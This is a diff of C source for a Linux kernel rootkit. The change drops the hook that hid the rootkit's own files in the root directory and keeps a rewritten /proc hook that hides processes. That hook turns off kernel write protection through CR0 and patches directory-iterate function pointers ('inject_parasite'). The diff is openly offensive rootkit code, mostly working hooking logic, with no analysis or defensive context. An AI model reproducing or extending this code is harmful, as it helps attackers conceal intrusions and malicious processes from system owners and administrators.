@@ -97,7 +97,7 @@ static int 	procfs_entry_init(void);
 static ssize_t 	procfs_write(struct file *,const char __user *,size_t,loff_t*);
 static ssize_t  procfs_read(struct file *,char __user *,size_t,loff_t *); 
 static int 	hide_pid(const char *,size_t);
-static int  	unhide_pid(const char *,size_t);
+static int  unhide_pid(const char *,size_t);
 
 
 static int 	hooklist_append(void *,void *);
@@ -270,37 +270,19 @@ static int dup_procfs_filldir(void *_buf,
 	return struct_procfs_filldir(_buf,name,namelen,offset,ino,d_type);
 }
 
-static int dup_rootfs_filldir(void *_buf,
-				  const char *name,
-				  int namelen,
-				  loff_t offset,
-				  u64 ino,
-				  unsigned int d_type)
-{	
-	if (strncmp(name,R00TKIT_NAME,R00TKIT_NAMELEN) == 0)
-		return 0;
-
-	return struct_rootfs_filldir(_buf,name,namelen,offset,ino,d_type);
-}
-
 LIST_HEAD(hooked_functions_listhead);
 
-#define filesytsem_hook_iterate(targetfs)							\
-		static int filesystem_##targetfs##_hook_iterate(struct file *fp,			\
-								   struct dir_context *ctx)		\
-		{											\
-			int retval;									\
-			struct dircontext *kit_ctx = (struct dircontext *)ctx;	\
-			struct_##targetfs##_filldir = ctx->actor;					\
-			kit_ctx->actor = (filldir_t)dup_##targetfs##_filldir;			\
-			inject_parasite(struct_##targetfs##_iterate,REMOVE_PARASITE);			\
-			retval = struct_##targetfs##_iterate(fp,(struct dir_context *)kit_ctx);	\
-			inject_parasite(struct_##targetfs##_iterate,INSTALL_PARASITE);			\
-			return retval;									\
-		}
-
-filesytsem_hook_iterate(procfs)
-filesytsem_hook_iterate(rootfs)
+static int filesystem_procfs_hook_iterate(struct file *fp, struct dir_context *ctx)
+{
+	int retval;
+	struct dircontext *kit_ctx = (struct dircontext *)ctx;
+	struct_procfs_filldir = ctx->actor;
+	kit_ctx->actor = (filldir_t)dup_procfs_filldir;
+	inject_parasite(struct_procfs_iterate,REMOVE_PARASITE);
+	retval = struct_procfs_iterate(fp,(struct dir_context *)kit_ctx);
+	inject_parasite(struct_procfs_iterate,INSTALL_PARASITE);
+	return retval;
+} 
 
 static int hooklist_append(void *target_func_addr,void *func)
 {
@@ -336,7 +318,7 @@ static void inject_parasite(void *target_func_addr,unsigned char install_parasit
  
 	preempt_disable();
 
-	write_cr0(read_cr0() & (~ 0x10000)); \
+	write_cr0(read_cr0() & (~ 0x10000));
 			
 	list_for_each_entry(hook,&hooked_functions_listhead,hook_list)
 	{
@@ -353,7 +335,7 @@ static void inject_parasite(void *target_func_addr,unsigned char install_parasit
 		}
 	}
 
-	write_cr0(read_cr0() | 0x10000); \
+	write_cr0(read_cr0() | 0x10000);
 
 	preempt_enable();
 }
@@ -361,28 +343,21 @@ static void inject_parasite(void *target_func_addr,unsigned char install_parasit
 
 static int hook_func()
 {
-	struct file *procfs_fp,*rootfs_fp;
-	struct file_operations *procfs_fops,*rootfs_fops;
+	struct file *procfs_fp;
+	struct file_operations *procfs_fops;
 
-	if (((procfs_fp = filp_open("/proc",O_RDONLY,0)) == NULL) || 
-					((rootfs_fp = filp_open("/",O_RDONLY,0)) == NULL))
+	if ((procfs_fp = filp_open("/proc",O_RDONLY,0)) == NULL)
 		return 0;
 
 	procfs_fops = (struct file_operations *)procfs_fp->f_op;
-	rootfs_fops = (struct file_operations *)rootfs_fp->f_op;
-
 
 	struct_procfs_iterate = procfs_fops->iterate;
-	struct_rootfs_iterate = rootfs_fops->iterate;
-	if (!hooklist_append(struct_procfs_iterate,filesystem_procfs_hook_iterate) ||
-			!hooklist_append(struct_rootfs_iterate,filesystem_rootfs_hook_iterate))
+	if (!hooklist_append(struct_procfs_iterate,filesystem_procfs_hook_iterate))
 		return 0;
 
 	inject_parasite(struct_procfs_iterate,INSTALL_PARASITE);
-	inject_parasite(struct_rootfs_iterate,INSTALL_PARASITE);
 	
 	filp_close(procfs_fp,0);
-	filp_close(rootfs_fp,0);
 
 	return 1;
 }
